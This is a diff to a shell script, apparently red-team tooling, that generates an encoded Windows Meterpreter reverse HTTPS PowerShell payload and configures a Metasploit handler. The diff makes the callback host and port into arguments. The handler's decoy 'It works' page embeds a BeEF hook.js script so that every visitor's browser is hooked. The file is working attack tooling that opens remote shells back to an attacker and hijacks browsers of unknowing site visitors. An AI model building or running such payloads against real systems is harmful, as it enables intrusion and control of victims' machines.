@@ -2,11 +2,13 @@ psh_winmetrev_https() {
   # Makes a Windows Meterpreter Reverse HTTPS Payload as a powershell
   # modified to use beefhooks for anyone visiting the site and the UUID is wrong
   # enables UUID Tracking (whitelistin) for payloads, ignores the rest
+  lhost=$1
+  lport=$2
   setpayvars() {
     d_beef="http://BeeFHostHere.tld:port/hook.js"
     d_payload="-p windows/meterpreter/reverse_https"
-    d_lhost="lhost=12.34.56.78"
-    d_lport="lport=443"
+    d_lhost="lhost=`echo $lhost`"
+    d_lport="lport=`echo $lport`"
     d_uri="luri='/'"
     d_encode="-e x86/shikata_ga_nai -i 10"
     d_nop="-n 100"
@@ -44,7 +46,7 @@ psh_winmetrev_https() {
     d_payload="set payload windows/meterpreter/reverse_https"
     d_dishandler="set DisablePayloadHandler true"
     d_lhost="set lhost 0.0.0.0"
-    d_lport="set lport 443"
+    d_lport="set lport `echo $lport`"
     d_uri="set luri '/'"
     d_unknown_res="set HttpUnknownRequestResponse \"<html><body><h1>It works</h1><script type='text/javascript' src='`echo $d_beef`'></script></body></html>\""
     d_ua="set MeterpreterUserAgent \"Mozilla (Server Firefox)\""
@@ -70,4 +72,4 @@ psh_winmetrev_https() {
   rcgen
   makeXtermLog "Meterpreter_Handler_WinMetRevHTTPS" "$msfc -r $msfs/winmetrevhttps.rc" &
 }
-psh_winmetrev_https
+psh_winmetrev_https 127.0.0.1 443
